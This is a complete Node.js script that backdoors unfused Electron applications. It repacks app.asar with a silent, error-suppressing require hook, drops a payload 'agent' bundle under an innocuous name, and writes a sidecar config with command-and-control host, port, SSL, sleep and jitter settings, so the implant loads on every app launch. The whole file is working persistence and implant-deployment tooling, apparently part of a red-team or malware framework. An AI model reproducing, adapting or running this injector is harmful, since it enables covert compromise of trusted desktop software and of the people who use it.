#!/usr/bin/env node
// inject_asar.js — script-jack an UNFUSED Electron app (resources/app.asar).
//
// Layout (everything dynamic lives OUTSIDE the read-only archive):
//   resources/app.asar      <- repacked: main entry gains ONE guarded hook line
//   resources/app.asar.bak  <- pristine backup
//   resources/<name>.js     <- the agent bundle (updatable without repacking)
//   resources/<name>.json   <- sidecar config (session key persists here)
//
// Usage:
//   node scripts/inject_asar.js --app <dir|app.asar> --payload dist/bundle.js \
//        [--name adpt] [--id cafe0011] [--host H --port N --ssl] [--sleep 30] \
//        [--jitter 20] [--debug] [--clean]
const fs = require('fs');
const path = require('path');
const os = require('os');
const { readArchive, readFileBytes, extract, pack, writeArchive } = require('./asar');

const arg = (n, d) => { const i = process.argv.indexOf('--' + n); return i >= 0 && process.argv[i + 1] ? process.argv[i + 1] : d; };
const has = (n) => process.argv.includes('--' + n);
const die = (m) => { console.error('[inject] ' + m); process.exit(1); };

const MARKER = '/*@@lw*/';

function resolveAsar(a) {
  if (!a) die('usage: inject_asar.js --app <dir|asar> --payload <bundle.js> [opts]');
  if (a.endsWith('.asar') && fs.existsSync(a)) return path.resolve(a);
  for (const c of [path.join(a, 'resources', 'app.asar'), path.join(a, 'app.asar')])
    if (fs.existsSync(c)) return c;
  die('no app.asar under ' + a);
}

const asarPath = resolveAsar(arg('app', null));
const resourcesDir = path.dirname(asarPath);
const bakPath = asarPath + '.bak';
const name = arg('name', 'adpt'); // neutral short stem; files: <name>.js/.json
const payloadPath = path.join(resourcesDir, name + '.js');
const sidecarPath = path.join(resourcesDir, name + '.json');

if (has('clean')) {
  let n = 0;
  if (fs.existsSync(bakPath)) { fs.copyFileSync(bakPath, asarPath); fs.unlinkSync(bakPath); n++; }
  for (const p of [payloadPath, sidecarPath]) if (fs.existsSync(p)) { fs.unlinkSync(p); n++; }
  console.log(`[inject] clean: restored/removed ${n} artifact(s)`);
  process.exit(0);
}

const srcPayload = arg('payload', null);
if (!srcPayload || !fs.existsSync(srcPayload)) die('--payload <built bundle> required (npm run build)');

// hook: payload path relative to the main entry INSIDE the archive (dev-mode
// resourcesPath points at the electron binary, not our app — hop from __dirname)
const hookLineFor = (entryDepth) => {
  const hops = Array(entryDepth).fill("'..'").join(', ');
  return `try{require(require('path').join(__dirname,${hops},${JSON.stringify(name + '.js')}))}catch(e){}`;
};

if (!fs.existsSync(bakPath)) { fs.copyFileSync(asarPath, bakPath); console.log('[inject] backup -> ' + path.basename(bakPath)); }
fs.copyFileSync(srcPayload, payloadPath);

const sidecar = {
  debug: has('debug'),
  agent_id: arg('id', 'auto'),
  host: arg('host', '127.0.0.1'),
  port: parseInt(arg('port', '8443'), 10),
  ssl: has('ssl'),
  sleep_delay: parseInt(arg('sleep', '30'), 10),
  jitter_delay: parseInt(arg('jitter', '20'), 10),
};
let finalSidecar = sidecar;
try {
  if (fs.existsSync(sidecarPath)) {
    const prev = JSON.parse(fs.readFileSync(sidecarPath, 'utf8'));
    if (String(prev.agent_id) !== String(sidecar.agent_id)) delete prev.session_key; // new id => fresh key
    finalSidecar = { ...prev, ...sidecar };
  }
} catch (_) {}
fs.writeFileSync(sidecarPath, JSON.stringify(finalSidecar, null, 2) + '\n');

const arch = readArchive(asarPath);
const pkgEntry = arch.header.files['package.json'];
if (!pkgEntry) die('app.asar has no root package.json');
const pkg = JSON.parse(readFileBytes(asarPath, arch, pkgEntry).toString('utf8'));
const mainRel = String(pkg.main || 'index.js').replace(/^\.\//, '');
let mainNode = arch.header.files;
const parts = mainRel.split('/');
for (let i = 0; i < parts.length; i++) {
  if (!mainNode[parts[i]]) die(`main entry '${mainRel}' not in archive`);
  mainNode = i < parts.length - 1 ? mainNode[parts[i]].files : mainNode[parts[i]];
}

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lw-asar-'));
let patched = false;
try {
  extract(asarPath, tmp);
  const mainAbs = path.join(tmp, mainRel);
  let src = fs.readFileSync(mainAbs, 'utf8');
  if (src.includes(MARKER)) {
    console.log('[inject] main already hooked — payload/config refreshed only');
  } else {
    src = src.replace(/\s*$/, '') + `\n${MARKER}\n${hookLineFor(parts.length)}\n`;
    fs.writeFileSync(mainAbs, src);
    patched = true;
  }
  const packed = pack(tmp, { integrity: true });
  writeArchive(asarPath, packed);
} finally {
  fs.rmSync(tmp, { recursive: true, force: true });
}

console.log(`[inject] archive : ${asarPath}${patched ? ' (main hooked + repacked)' : ''}`);
console.log(`[inject] payload : ${payloadPath}`);
console.log(`[inject] sidecar : ${sidecarPath} (agent_id=${finalSidecar.agent_id}, ${finalSidecar.ssl ? 'https' : 'http'}://${finalSidecar.host}:${finalSidecar.port})`);
